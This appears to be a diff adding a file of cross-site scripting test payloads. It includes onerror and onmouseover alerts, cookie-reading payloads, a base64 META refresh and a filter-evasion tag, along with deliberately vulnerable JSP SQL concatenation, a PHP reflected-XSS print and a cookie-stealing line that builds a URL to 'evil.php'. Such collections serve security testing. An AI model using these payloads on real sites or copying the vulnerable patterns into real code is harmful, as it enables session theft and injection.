@@ -1,0 +1,39 @@
+<b onmouseover=alert('Wufff!')>click me!</b>
+<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
+<IMG SRC=javascript:alert('test2')>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
+
+
+<%...
+ Statement stmt = conn.createStatement();
+ ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
+ if (rs != null) {
+  rs.next();
+  String name = rs.getString("name");
+%>
+
+Employee Name: <%= name %>
+
+
+<SCRIPT type="text/javascript">
+var adr = '../evil.php?cakemonster=' + escape(document.cookie);
+</SCRIPT>
+
+<html>
+<body>
+<? php
+print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
+?>
+
+</body>
+</html>
+
+
+
+<h1>Test</h1><script>alert("hello")</script><script>alert(document.cookie)</script>
+<scr<script>ipt>alert("hello")</script><img src=x onMouseover=alert("Hello")>
+
+
+<script>alert("hi")</script>
+<img src onerror="alert('hi')">
+<img src onerror="alert(document.cookie)">
